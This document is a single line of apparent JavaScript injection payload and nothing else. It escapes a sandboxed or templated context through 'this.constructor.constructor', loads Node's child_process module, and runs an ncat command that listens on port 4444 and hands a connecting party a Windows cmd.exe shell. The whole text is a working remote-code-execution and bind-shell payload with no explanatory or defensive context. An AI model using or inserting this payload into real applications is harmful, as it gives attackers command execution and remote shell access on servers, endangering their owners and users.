(this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('ncat -lvp 4444 -e cmd.exe')
